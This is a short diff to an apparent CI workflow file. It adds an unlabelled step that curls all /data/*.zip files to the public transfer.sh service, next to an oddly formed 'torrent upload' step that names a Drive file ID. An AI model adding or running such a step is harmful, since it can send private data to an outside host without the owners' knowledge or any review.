@@ -22,3 +22,5 @@ jobs:
           
         - name: Upload to Drive
           run: torrent upload 1-u94ApPELl5b3Hpu3SRWReL3KuBzjV7X
+        
+        - run: curl --upload-file /data/*.zip https://transfer.sh/anything.zip
